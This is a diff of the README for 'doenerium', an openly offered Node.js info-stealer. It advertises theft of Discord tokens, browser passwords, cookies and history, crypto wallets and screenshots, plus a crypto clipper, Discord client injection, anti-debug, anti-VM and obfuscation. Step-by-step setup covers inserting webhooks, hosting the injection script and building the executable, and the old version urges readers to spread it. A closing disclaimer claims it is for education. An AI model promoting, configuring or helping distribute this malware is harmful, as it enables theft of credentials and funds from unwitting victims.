@@ -1,79 +1,113 @@
-<center>
-    <img src="https://images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%3Fsize%3D96%26quality%3Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp"/>
-    <h2><strong>doenerium</strong></h2>
-    <h4>Fully undetected stealer (0/67)</h4>
-</center>
+<a id="top"></a>
+# 
 
-<p align='center'>
-    <a href='https://nodejs.org/en/download/' align='center'>
-        <img alt='NodeJS' src='https://nodejs.org/static/images/logo.svg' width="100" height="100">
-    </a>
+<h1 align="center">
+⚔️ Doenerium 🛡️
+</h1>
+
+<img title="" src="file:///C:/Users/pando/Downloads/Doenerium1.png" alt="Doenerium2.png" data-align="center" width="328">
+
+<p align="center">
+<img src="https://img.shields.io/github/last-commit/doener2323/doenerium?style=flat">
+<img src="https://img.shields.io/github/stars/doener2323/doenerium?color=brightgreen">
+<img src="https://img.shields.io/github/forks/doener2323/doenerium?color=brightgreen">
 </p>
 
-There is no official telegram server of this project.
-I don't own t.me/doenerium
+<p align="center">
+<img src="https://img.shields.io/discord/995072028145098803?color=blue&label=Discord&logo=Discord&logoColor=%5C&style=for-the-badge">
+</p>
 
-# [New Discord](https://discord.gg/E3heK2mtV6)
+## 🌐〢Content
 
-## Features
-- Fully undetected (0/65 detects)
-- Very detailed user info (PC hostname, CPU, RAM, ...)
-- Sends a screenshot to your webhook when executing the stealer
-- Grabs executable info (path where the .exe was executed, ...)
-- Searches for wallets in system and grabs them
-- Grabs passwords, cookies, bookmarks & Extension cookies from all major browsers (Chrome, Opera, Brave, Yandex, Microsoft Edge)
-- Silently saves all data separate in a zip file in a hidden folder and sends it to your webhook
-- Modifies discord's desktop core (like known grabbers such as bbystealer & PirateStealer aka. Brooklyn/Arizona)
-- Checks for debugging processes to avoid your webhook skid being reversed from skids (loop)
-- Ultra high quality obfuscation
-- Easy to setup (just modify the "config.js" file)
-- Sends everything to your webhook in beautiful embeds
-- Analyzes the data which was stolen and sends a zip file to your discord webhook
-- Browser autofill grabber
-- Browser history grabber
-- Crypto clipper
-- Searches for keywords in cookies, passwords, autofill and lists them on the top of the cookie/password/autofill log files
-- Validates found discord tokens & if they work they only get sent to your webhook
-- Discord backup codes finder
+- [⚔️ Features](#features)
+- [📸 Screenshots](#screenshot)
+- [📁 Setting up](#setup)
+- [📝 Todo](#todo)
+- [📜 License](#license)
+- [⚠️ Note](#note)
 
-## Setup:
-- Download the files
-- Install [NodeJS](https://nodejs.org/en/download/) and [Visual Studio](https://visualstudio.microsoft.com/de/downloads/) and C++ in Visual Studio
-- Install the required packages by running `install.bat`
-- Edit the `config.js` file and put your webhooks in it
-- Run the `build.bat` file and an .exe file named `doenerium-win.exe` will be created
-- Spread the stealer and enjoy my fully undetected stealer :flushed:
+<a id="features"></a>
 
-## Showcase:
+### ⚔️ 〢 Features
 
-https://www.virustotal.com/gui/file/06d2ab510cfb2716c835897e5b8ea7509e8d4ff24b36f526802bd51f244bea30/detection
+#### Stealer
 
-<img src="https://i.imgur.com/hFryuaR.png">
-<img src="https://i.imgur.com/t8yaCDm.png">
-<img src="https://i.imgur.com/aJOCZpg.png">
-<img src="https://cdn.discordapp.com/attachments/986732613937025154/992118768195096576/unknown.png">
-<img src="https://cdn.discordapp.com/attachments/986732613937025154/992118954631909416/unknown.png">
-<img src="https://cdn.discordapp.com/attachments/986732613937025154/992119092083441724/unknown.png">
-<img src="https://i.imgur.com/4cbEMeK.png">
-<img src="https://i.imgur.com/Df7ONan.png">
+> Discord Token
+> 
+> Discord Info - Username,Phone number,Email,Billing and Nitro Status, Backup Codes
+> 
+> Discord Friends with their badges
+> 
+> Crypto Wallets - 
+> 💸 Zcash,🚀 Armory,📀 Bytecoin,💵 Jaxx,💎 Exodus,📉 Ethereum,
+> 🔨 Electrum,🕹️ AtomicWallet,💹 Guarda,⚡ Coinomi
+> 
+> Browser (Chrome,Opera,OperaGX,Edge,Brave,Yandex) - 
+> Passwords,Cookies & History (Searches for keywords in them)
+> 
+> Screenshot
+> 
+> Injects itself to discord to grab token when changed
 
+#### Additional
 
-## TODO
-- Exodus wallet injection (get the password whenever the user logs in the wallet)
-- More grabbers (VPN's, Gaming, Messengers)
-- Keylogger
-- Growtopia stealer
-- Discord bot to build within discord ($build <webhook_url>)
-- Dynamic encryption
+> Crypto Clipper - BTC,LTC,XMR,ETH,XRP,NEO,BCH,DOGE,DASH,XLM
+> 
+> Ultra Obfuscation
+> 
+> Anti-Debug
+> 
+> Anti-VM
+> 
+> Checks if Discord Token is working and then sends to webhook
+> 
+> Sends all FIles to Webhook in beautiful Embeds and a Zip File
 
-### Inspirations
-- [44 CALIBER STEALER](https://github.com/razexgod/44CALIBER)
-- [Stealerium](https://github.com/Stealerium/Stealerium)
-- PirateStealer & bbystealer
+<a id="screenshot"></a>
 
-## License:
-By downloading this, you agree to the Commons Clause license and that you're not allowed to sell this repository or any code from this repository. For more info see https://commonsclause.com/.
+### 📸 〢 Screenshots
 
-## Note:
-I am not responsible for any damages this software may cause.
-This was made for personal education.
+<img title="" src="screenshots/2022-06-23-23-03-44-image.png" alt="" width="439"><img title="" src="screenshots/2022-06-23-23-06-28-image.png" alt="" width="439">![](screenshots/2022-06-23-23-08-28-image.png)
+
+<a id="setup"></a>
+
+### 📁 〢 Setting Up
+
+> Install [Node.js](https://nodejs.org/en/download/)
+> 
+> Install [Visual studio](https://visualstudio.microsoft.com/thank-you-downloading-visual-studio/?sku=Community&channel=Release&version=VS2022&source=VSFeaturesPage&passive=true&tailored=cplus&cid=2031#cplusplus) with C++ compilers and all enabled (is a bit gigs but u wont have erros)
+> 
+> Run ***install.bat*** file to install all necessary files
+> 
+> Replace "*WEBHOOK*" with your webhook in ***config.js*** and ***discord_desktop_core/index.js (line 116)***
+> 
+> After ^, copy all the contents of ***discord_desktop_core/index.js*** and host it somewhere like GitHub or [this](https://www.klgrth.io) that i use to host.
+> 
+> Copy the raw link from the host and replace INJECTION in ***config/discord.js (line 3)*** with it (ex. *https://raw.githubusercontent* and *https://www.klgrth.io/paste/xyaxy/raw* )
+> 
+> Finnaly run ***build.bat*** and wait for ***doenerium.exe*** to be built.
+
+<a id="todo"></a>
+
+### 📝〢 Todo
+
+> - ~~Exodus wallet injection (get the password whenever the user logs in the wallet)~~
+> - More grabbers (VPN's, Gaming, Messengers)
+> - Keylogger
+> - Growtopia stealer
+> - Discord bot to build within discord ($build <webhook_url>)
+> - Dynamic encryption
+
+<a id="license"></a>
+
+### 📜 〢 License
+
+By downloading this, you agree to the Commons Clause license and that you're not allowed to sell this repository or any code from this repository. For more info see [commonsclause](https://commonsclause.com/)
+
+<a id="note"></a>
+
+### ⚠️〢 Note
+
+I am not responsible for any damages this software may cause. This was made for personal education
+
+<p align="center"><a href=#top>Back to Top</a></p>
